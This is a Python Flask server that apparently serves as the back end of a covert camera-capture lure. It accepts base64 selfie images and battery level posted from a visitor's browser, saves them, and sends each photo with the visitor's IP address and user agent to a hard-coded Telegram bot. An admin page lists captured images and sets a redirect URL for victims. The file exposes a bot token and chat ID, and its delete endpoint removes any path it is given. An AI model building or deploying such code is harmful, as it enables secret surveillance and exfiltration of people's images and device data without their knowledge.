from flask import Flask, request, jsonify, render_template, redirect, url_for
import base64
import re
import os
from datetime import datetime
import requests

app = Flask(__name__, static_url_path='/static')

# Ensure the 'static' directory exists
if not os.path.exists('static'):
    os.makedirs('static')

# Store the redirect URL in a simple text file
REDIRECT_URL_FILE = 'redirect_url.txt'
if not os.path.exists(REDIRECT_URL_FILE):
    with open(REDIRECT_URL_FILE, 'w') as f:
        f.write('https://example.com')  # Default redirect URL

def get_redirect_url():
    with open(REDIRECT_URL_FILE, 'r') as f:
        return f.read().strip()

def set_redirect_url(url):
    with open(REDIRECT_URL_FILE, 'w') as f:
        f.write(url)

# Telegram Bot API details
TELEGRAM_BOT_TOKEN = '7125865296:AAHI_w7KGa152kCOVPNgsavTNIfatUR0hX8'
TELEGRAM_CHAT_ID = '5197344486'

# Function to send photo to Telegram
def send_photo_to_telegram(photo_path, ip, user_agent, battery):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    files = {'photo': open(photo_path, 'rb')}
    caption = f"IP: {ip}\nUser Agent: {user_agent}\nBattery: {battery}%"
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
    response = requests.post(url, files=files, data=data)
    return response.json()

# Endpoint to handle image upload
@app.route('/upload', methods=['POST'])
def upload_image():
    data = request.get_json()
    image_data = data['image']
    battery = data['battery']
    # Remove the data:image/png;base64, part
    image_data = re.sub('^data:image/.+;base64,', '', image_data)
    # Decode the image data
    image_data = base64.b64decode(image_data)

    # Save the image with a unique filename
    filename = f'static/selfie_{datetime.now().strftime("%Y%m%d_%H%M%S_%f")}.png'
    with open(filename, 'wb') as f:
        f.write(image_data)

    # Get IP and User Agent
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Send the image and information to Telegram
    send_photo_to_telegram(filename, ip, user_agent, battery)

    return jsonify({'message': 'Image uploaded and sent to Telegram successfully', 'filename': filename})

# Serve the main page
@app.route('/')
def index():
    return render_template('index.html', redirect_url=get_redirect_url())

# Serve the admin page
@app.route('/admin')
def admin():
    image_files = os.listdir('static')
    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
    return render_template('admin.html', images=image_files, redirect_url=get_redirect_url())

# Handle setting the redirect URL
@app.route('/set_redirect_url', methods=['POST'])
def set_redirect():
    url = request.form.get('redirect_url')
    set_redirect_url(url)
    return redirect(url_for('admin'))

# Serve the lightweight mobile-friendly admin page
@app.route('/admin2')
def admin2():
    image_files = os.listdir('static')
    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
    return render_template('admin2.html', images=image_files)

# Endpoint to delete images
@app.route('/delete/<path:filename>', methods=['POST'])
def delete_image(filename):
    try:
        os.remove(filename)
        return redirect(url_for('admin'))
    except Exception as e:
        return str(e), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
